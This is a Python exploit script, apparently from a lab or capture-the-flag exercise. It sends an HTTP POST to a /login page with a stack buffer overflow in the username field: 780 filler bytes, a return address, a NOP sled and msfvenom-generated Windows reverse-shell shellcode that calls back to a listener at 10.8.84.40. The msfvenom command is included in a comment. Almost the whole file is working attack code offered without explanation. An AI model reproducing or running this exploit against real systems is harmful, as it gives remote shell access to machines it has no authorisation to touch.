#!/usr/bin/python

import socket

import os

import sys

#msfvenom -p windows/shell_reverse_tcp lport=1234 lhost=10.8.84.40 -a x86 -f python -b "\x00\x0a\x0d\x25\x26\x2b\x3d"


buf =  b""                                                                                                      
buf += b"\xd9\xc5\xba\xd5\xc2\x9e\xc6\xd9\x74\x24\xf4\x5e\x31"                                                  
buf += b"\xc9\xb1\x52\x31\x56\x17\x03\x56\x17\x83\x3b\x3e\x7c"                                                  
buf += b"\x33\x3f\x57\x03\xbc\xbf\xa8\x64\x34\x5a\x99\xa4\x22"                                                  
buf += b"\x2f\x8a\x14\x20\x7d\x27\xde\x64\x95\xbc\x92\xa0\x9a"                                                  
buf += b"\x75\x18\x97\x95\x86\x31\xeb\xb4\x04\x48\x38\x16\x34"                                                   
buf += b"\x83\x4d\x57\x71\xfe\xbc\x05\x2a\x74\x12\xb9\x5f\xc0"
buf += b"\xaf\x32\x13\xc4\xb7\xa7\xe4\xe7\x96\x76\x7e\xbe\x38"
buf += b"\x79\x53\xca\x70\x61\xb0\xf7\xcb\x1a\x02\x83\xcd\xca"
buf += b"\x5a\x6c\x61\x33\x53\x9f\x7b\x74\x54\x40\x0e\x8c\xa6"
buf += b"\xfd\x09\x4b\xd4\xd9\x9c\x4f\x7e\xa9\x07\xab\x7e\x7e"
buf += b"\xd1\x38\x8c\xcb\x95\x66\x91\xca\x7a\x1d\xad\x47\x7d"
buf += b"\xf1\x27\x13\x5a\xd5\x6c\xc7\xc3\x4c\xc9\xa6\xfc\x8e"
buf += b"\xb2\x17\x59\xc5\x5f\x43\xd0\x84\x37\xa0\xd9\x36\xc8"
buf += b"\xae\x6a\x45\xfa\x71\xc1\xc1\xb6\xfa\xcf\x16\xb8\xd0"
buf += b"\xa8\x88\x47\xdb\xc8\x81\x83\x8f\x98\xb9\x22\xb0\x72"
buf += b"\x39\xca\x65\xd4\x69\x64\xd6\x95\xd9\xc4\x86\x7d\x33"
buf += b"\xcb\xf9\x9e\x3c\x01\x92\x35\xc7\xc2\x97\xc1\x93\x3a"
buf += b"\xc0\xd3\x1b\x3f\xc2\x5d\xfd\x55\xf2\x0b\x56\xc2\x6b"
buf += b"\x16\x2c\x73\x73\x8c\x49\xb3\xff\x23\xae\x7a\x08\x49"
buf += b"\xbc\xeb\xf8\x04\x9e\xba\x07\xb3\xb6\x21\x95\x58\x46"
buf += b"\x2f\x86\xf6\x11\x78\x78\x0f\xf7\x94\x23\xb9\xe5\x64"
buf += b"\xb5\x82\xad\xb2\x06\x0c\x2c\x36\x32\x2a\x3e\x8e\xbb"
buf += b"\x76\x6a\x5e\xea\x20\xc4\x18\x44\x83\xbe\xf2\x3b\x4d"
buf += b"\x56\x82\x77\x4e\x20\x8b\x5d\x38\xcc\x3a\x08\x7d\xf3"
buf += b"\xf3\xdc\x89\x8c\xe9\x7c\x75\x47\xaa\x8d\x3c\xc5\x9b"
buf += b"\x05\x99\x9c\x99\x4b\x1a\x4b\xdd\x75\x99\x79\x9e\x81"
buf += b"\x81\x08\x9b\xce\x05\xe1\xd1\x5f\xe0\x05\x45\x5f\x21"

crash = "A" * 780 + "\x83\x0c\x09\x10" + "\x90" * 22 + buf

fuzz = "username=" + crash + "&password=A"

buffer = "POST /login HTTP/1.1\r\n"

buffer +="Host: ip\r\n"

buffer +="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"

buffer +="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"

buffer +="Accept-Language: en-US,en;q=0.5\r\n"

buffer +="Referer: http://ip/login\r\n"

buffer +="Connection: close\r\n"

buffer +="Content-Type: application/x-www-form-urlencoded\r\n"

buffer +="Content-Length: "+str(len(fuzz))+"\r\n"

buffer +="\r\n"

buffer +=fuzz

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

expl.connect(("10.10.43.246", 80))

expl.send(buffer)

expl.close()